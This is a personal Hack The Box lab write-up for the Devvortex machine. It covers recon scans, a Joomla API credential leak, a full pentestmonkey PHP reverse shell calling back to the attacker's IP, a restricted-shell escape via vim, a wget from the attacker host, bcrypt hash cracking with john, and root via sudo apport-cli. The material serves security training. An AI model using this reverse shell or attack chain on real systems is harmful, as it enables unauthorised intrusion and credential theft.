ip addr : `10.10.11.242`

#Date 15-03-24 || Rohit Tiwari


`Nmap scan full 1K port
``` bash
┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Devvortex_10.10.11.242]
└─$ nmap -p- --min-rate 1000 $ip

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


`Nmap fully scan`

``` bash
┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Devvortex_10.10.11.242]
└─$ sudo nmap -sVC -v -A  $ip  -T4 -oN Devvortex

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```






`NIkto scan`


``` bash


┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Devvortex_10.10.11.242]
└─$ nikto -h  http://$ip


+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://devvortex.htb/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
```


may be found that the nginx is outdated 

![[Pasted image 20240315130349.png]]



#Port_80`

>on  visting port 80 found a simple webpage

![[Pasted image 20240315131143.png]]

>On inspecting the source code found some javascript

![[Pasted image 20240315131345.png]]

on furthure investigating the source code found

![[Pasted image 20240315131415.png]]

#LInk: view-source:https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js


# Tried fuzzing the site found nothing so tried subdomain

``` bash

┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Devvortex_10.10.11.242]
└─$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -t 50 --hc 302 

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev" 


```

# Found a site

![[Pasted image 20240315134811.png]]


## Found Robots.txt

``` js
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```


# Foothold

on researching about joomla founded on 




and on checking the exploit code found vulnerable endpoint

![[Pasted image 20240315143059.png]]


# link : `http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`


on this database is exposed found some credential

![[Pasted image 20240315143134.png]]

```json
{
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },

```


![[Pasted image 20240315142441.png]]

## using the cred username as lewis loged into joomla admmin pannel




## After login when to system-> themes ->  adminstrator themes and enter the payload got shelll

![[Pasted image 20240320154546.png]]


![[Pasted image 20240315221558.png]]

# `payload used`

``` php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.252';
$port = 2929;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>

```

![[Pasted image 20240315221650.png]]

## after that found that it's a resistricted shell so 

THis can be bypassed using the vim for more checkout GFTO bins or other bypass tricks

command used :

``` bash
set shell=/bin/bash

shell

export PATH=/bin/:/usr/bin/:/usr/local/bin:$PATH
```

![file:///tmp/.GM11K2/1.png](file:///tmp/.GM11K2/1.png)

![file:///tmp/.GM11K2/2.png](file:///tmp/.GM11K2/2.png)

![file:///tmp/.GM11K2/3.png](file:///tmp/.GM11K2/3.png)

![file:///tmp/.GM11K2/4.png](file:///tmp/.GM11K2/4.png)

so bypassed ..


wget http://10.10.14.93:80/ex.py



# Got mysql access

```bash
www-data@devvortex:/$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8712
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)


```

found a table of user users

![[Pasted image 20240320160953.png]]


cred found

lewis :  $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u


alright on checking the ahsh found that it's bycrpt so to mehhtods to crack

```python
john --format=bcrypt --wordlist=$wordlists/passwords/rockyou.txt hash.txt
```

```
┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Devvortex_10.10.11.242/credentials]
└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:09 DONE (2024-03-20 17:26) 0.1094g/s 157.5p/s 157.5c/s 157.5C/s winston..michel
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

``` bash
logan@devvortex:~$ sudo  /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 2


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What particular problem do you observe?


Choices:
  1: Removable storage device is not mounted automatically
  2: Internal hard disk partition cannot be mounted manually
  3: Internal hard disk partition is not displayed in Places menu
  4: No permission to access files on storage device
  5: Documents cannot be opened in desktop UI on storage device
  6: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/C): 1

*** 

Please disconnect the problematic device now if it is still plugged in.

Press any key to continue... 


*** 

Please connect the problematic device now.

Press any key to continue... 

............................................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (799.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)


```

dont't know but somehow got privesc

https://twitter.com/intent/post?text=I just pwned Devvortex in Hack The Box!&url=https%3A%2F%2Fwww.hackthebox.com%2Fachievement%2Fmachine%2F629821%2F577&hashtags=hackthebox%2Chtb%2Ccybersecurity